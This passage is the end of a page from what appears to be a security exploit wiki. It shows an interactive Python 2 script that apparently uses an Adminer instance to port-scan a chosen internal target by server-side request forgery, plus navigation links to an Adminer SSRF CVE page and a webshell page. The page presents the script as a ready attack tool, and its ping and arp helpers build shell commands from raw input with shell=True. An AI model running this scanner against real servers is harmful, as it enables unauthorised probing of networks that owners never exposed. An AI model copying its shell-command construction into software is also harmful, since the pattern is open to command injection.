        <span class="nb">print</span> <span class="s2">&quot;Scan completed, no ports mined.&quot;</span>
    <span class="k">return</span> <span class="mi">0</span>



<span class="k">def</span><span class="w"> </span><span class="nf">arp</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="s2">&quot;-a&quot;</span> <span class="k">if</span> <span class="n">system_name</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">==</span><span class="s2">&quot;windows&quot;</span> <span class="k">else</span> <span class="s2">&quot;-e&quot;</span>
    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;arp &quot;</span> <span class="o">+</span> <span class="n">args</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="n">host</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>


<span class="k">def</span><span class="w"> </span><span class="nf">ping_host</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="s2">&quot;-n 1&quot;</span> <span class="k">if</span> <span class="n">system_name</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">==</span><span class="s2">&quot;windows&quot;</span> <span class="k">else</span> <span class="s2">&quot;-c 1&quot;</span>
    <span class="n">res</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;ping &quot;</span> <span class="o">+</span> <span class="n">args</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="n">host</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">:</span>
        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; down? trying ARP&#39;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">arp</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
            <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; unreachable.&#39;</span>
            <span class="k">return</span>
    <span class="k">return</span> <span class="n">res</span>



<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">port_range</span>
    <span class="nb">print</span> <span class="n">BANNER</span>
    <span class="n">greet</span><span class="p">()</span>
    <span class="n">ADMINER_VERSION</span><span class="o">=</span><span class="kc">False</span>
    <span class="n">PRINT_CLOSED</span><span class="o">=</span><span class="kc">False</span>
    <span class="n">USE_SSL</span><span class="o">=</span><span class="kc">None</span>

    <span class="n">ADMINER</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Adminer Host/IP&gt; &#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">ADMINER</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s1">&#39;Enter valid Host/IP&#39;</span>
        <span class="n">ADMINER</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Adminer Host/IP&gt; &#39;</span><span class="p">)</span>

    <span class="n">ADMINER_PORT</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Adminer Port&gt; &#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;^\d{1,5}$&quot;</span><span class="p">,</span><span class="n">ADMINER_PORT</span><span class="p">):</span>
        <span class="nb">print</span> <span class="s1">&#39;Enter a valid Port.&#39;</span>
        <span class="n">ADMINER_PORT</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Adminer Port&gt; &#39;</span><span class="p">)</span>

    <span class="n">ADMINER_URI</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Adminer URI [the adminer-&lt;version&gt;.php OR adminer/ dir path] &gt; &#39;</span><span class="p">)</span>
    <span class="n">TARGET</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Host/IP to Scan&gt; &#39;</span><span class="p">)</span>

    <span class="n">PORTS_TO_SCAN</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Port Range e.g. 21-25&gt; &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">plst</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(\d{1,5})-(\d{1,5})&quot;</span><span class="p">,</span><span class="n">PORTS_TO_SCAN</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">plst</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s1">&#39;Invalid ports, format is 1-1025&#39;</span>
        <span class="k">return</span>
        <span class="n">raw_input</span><span class="p">()</span> <span class="c1">#console up</span>

    <span class="n">port_range</span><span class="o">=</span><span class="n">chk_ports</span><span class="p">(</span><span class="n">PORTS_TO_SCAN</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">port_range</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="n">PRINT_CLOSED</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[+] Print closed ports? 1=Yes any key for No&gt; &#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">PRINT_CLOSED</span><span class="o">==</span><span class="s1">&#39;1&#39;</span><span class="p">:</span>
        <span class="n">PRINT_CLOSED</span><span class="o">=</span><span class="kc">True</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">PRINT_CLOSED</span><span class="o">=</span><span class="kc">False</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">ping_host</span><span class="p">(</span><span class="n">ADMINER</span><span class="p">):</span>
        <span class="nb">print</span> <span class="s1">&#39;host </span><span class="si">%s</span><span class="s1"> not reachable or blocking ping &#39;</span> <span class="o">%</span> <span class="n">ADMINER</span>  
        <span class="n">cont</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;Continue with scan? 1=Yes any key for No&gt; &#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">cont</span><span class="o">!=</span><span class="s1">&#39;1&#39;</span><span class="p">:</span>
            <span class="nb">print</span> <span class="s1">&#39;Scan aborted.&#39;</span>
            <span class="n">raw_input</span><span class="p">()</span> <span class="c1">#console up</span>
            <span class="k">return</span>


    <span class="n">USE_SSL</span><span class="o">=</span><span class="n">use_ssl</span><span class="p">(</span><span class="n">ADMINER</span><span class="p">,</span><span class="n">ADMINER_PORT</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">ADMINER_VERSION</span> <span class="o">=</span> <span class="n">version</span><span class="p">(</span><span class="n">ADMINER</span><span class="p">,</span><span class="n">ADMINER_PORT</span><span class="p">,</span><span class="n">ADMINER_URI</span><span class="p">,</span><span class="n">USE_SSL</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">ADMINER_VERSION</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s2">&quot;Can&#39;t retrieve Adminer script. check supplied URI.&quot;</span>
        <span class="n">raw_input</span><span class="p">()</span> <span class="c1">#console up</span>
        <span class="k">return</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">ADMINER_VERSION</span><span class="o">==</span><span class="mi">504</span><span class="p">:</span>
            <span class="n">raw_input</span><span class="p">()</span> <span class="c1">#console up</span>
            <span class="k">return</span>
        <span class="k">if</span> <span class="n">scan</span><span class="p">(</span><span class="n">ADMINER</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">ADMINER_PORT</span><span class="p">),</span><span class="n">ADMINER_URI</span><span class="p">,</span><span class="n">TARGET</span><span class="p">,</span><span class="n">PORTS_TO_SCAN</span><span class="p">,</span><span class="n">PRINT_CLOSED</span><span class="p">,</span><span class="n">USE_SSL</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
            <span class="n">more</span><span class="o">=</span><span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;Info: 1=Yes, any key for No&gt; &#39;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">more</span><span class="o">==</span><span class="s1">&#39;1&#39;</span><span class="p">:</span>
                <span class="n">info</span><span class="p">()</span>
                <span class="n">raw_input</span><span class="p">()</span> <span class="c1">#console up</span>


<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2021-21311/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2021-21311/" class="btn btn-xs btn-link">
        Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/" class="btn btn-xs btn-link">
        Adminers 1.1.3 （SQLite 3 写入一句话木马）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>